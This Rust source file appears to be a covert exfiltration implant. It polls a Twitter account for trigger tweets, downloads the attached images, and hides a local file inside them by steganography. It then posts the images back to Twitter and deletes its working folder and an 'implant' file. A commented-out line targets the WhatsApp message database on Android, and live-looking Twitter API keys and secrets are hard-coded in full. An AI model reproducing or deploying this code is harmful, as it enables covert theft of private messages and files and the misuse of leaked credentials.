extern crate egg_mode;

mod encoder;
mod errors;
mod utils;

use egg_mode::media::{media_types, upload_media};
use egg_mode::tweet::DraftTweet;
use encoder::Encoder;
use errors::Error;
use reqwest;
use std::env;
use std::fs;
use std::fs::File;
use std::io::prelude::*;
use std::path::PathBuf;
use std::string::ToString;
use std::{thread, time};
use tokio;
use utils::ByteMask;


#[allow(unused_must_use)]
fn main() -> Result<(), Error> {
    let mask = ByteMask::new(2)?;
    let path = env::current_dir()?;
    setup();
    pull_tweets();
    let mut i:u32 = 0;
    while i < 1 {
        println!("ENCODING {}", i);
        let jpg = format!("image_{}.jpg", i);
        let png = format!("image_{}encoded.png", i);
        encode(PathBuf::from(&jpg), PathBuf::from("/Users/connor/Desktop/newmessage.txt"), PathBuf::from(&png), mask)?;
        i = i + 1;
    }
    send_tweet();
    //encode(PathBuf::from("/sdcard/Pictures/myfavoritetoast.jpg"), PathBuf::from("/data/data/com.whatsapp/databases/msgstore.db"), PathBuf::from("/data/othertoast.png"), mask)?;
    //encode(PathBuf::from("/Users/connor/Desktop/image.jpg"), PathBuf::from("/Users/connor/Desktop/newmessage.txt"), PathBuf::from("/Users/connor/Desktop/othertoast.png"), mask)?;
    kill(PathBuf::from(path));
    Ok(())
}

#[allow(unused_must_use)]
fn setup() -> Result<(), Error> {
    fs::create_dir("tost")?;
    env::set_current_dir("tost");
    Ok(())
}

#[allow(unused_must_use)]
fn kill(og_path: PathBuf) -> Result<(), Error> {
    env::set_current_dir(og_path);
    fs::remove_dir_all("tost")?;
    fs::remove_file("implant")?;
    Ok(())
}

#[tokio::main]
async fn send_tweet() -> Result<(), Box<dyn std::error::Error>> {
    let con_token = egg_mode::KeyPair::new("Z5kqu3hywa02aW2BYNGeWkkXA", "xSGYyYwGEIu95Wc7pOAKh7aIW9kymStpxWVDC85i0MRjedvtj4");
    let access_token = egg_mode::KeyPair::new("1249802159178350599-C3zosoCFc0zdYrm4Fmk05WvMaMznZ4", "2FKoqwS5GA310J0bEy1X4djvjlFOeL2AdjmCpIT6MQSH7");
    let token = egg_mode::Token::Access {
        consumer: con_token,
        access: access_token,
    };
    let mut i:u32 = 0;
    while i < 1 {
        let mut tweet = DraftTweet::new("The toast is burnt");
        let typ = media_types::image_png();
        let image = PathBuf::from(&format!("image_{}encoded.png", i));
        let bytes = std::fs::read(image)?;
        let handle = upload_media(&bytes, &typ, &token).await?;
        tweet.add_media(handle.id.clone());
        println!("ADDED {}", i);
        tweet.send(&token).await?;
        println!("TWEETED {}", i);
        i = i + 1;
    }
    Ok(())
}

#[allow(unused_must_use)]
#[tokio::main]
async fn pull_tweets() -> Result<(), Box<dyn std::error::Error>> {
    let con_token = egg_mode::KeyPair::new("Z5kqu3hywa02aW2BYNGeWkkXA", "xSGYyYwGEIu95Wc7pOAKh7aIW9kymStpxWVDC85i0MRjedvtj4");
    let access_token = egg_mode::KeyPair::new("1249802159178350599-C3zosoCFc0zdYrm4Fmk05WvMaMznZ4", "2FKoqwS5GA310J0bEy1X4djvjlFOeL2AdjmCpIT6MQSH7");
    let token = egg_mode::Token::Access {
        consumer: con_token,
        access: access_token,
    };
    let user_id = "ToastDisciples";
    let mut end = false;
    let ten_secs = time::Duration::from_millis(10000);
    loop {
        let user = egg_mode::tweet::user_timeline(user_id, true, true, &token).with_page_size(100);
        let (_user, feed) = user.start().await?;
        let mut i:u32 = 0;
        for status in feed.iter() {
            if status.text.contains("We ate the toast") {
                end = true;
                break;
            }
            if let Some(ref media) = status.extended_entities{
                if status.text.contains("Burn the toast"){
                    for info in &media.media {
                        println!("{} {}", info.media_url, i);
                        let res = reqwest::get(&(info.media_url).to_string()).await?.bytes().await?;
                        let file_name = format!("image_{}.jpg", i);
                        let mut file = File::create(file_name).unwrap();
                        file.write_all(&res);
                        i = i + 1;
                    }
                }
            }
        }
        if end == true {
            break;
        }
        thread::sleep(ten_secs);
    }
    
    Ok(())
}

fn encode(image: PathBuf, secret: PathBuf, output: PathBuf, mask: ByteMask) -> Result<(), Error> {
    let mut encoder = Encoder::new(image, secret, mask)?;
    encoder.save(output)?;
    Ok(())
}

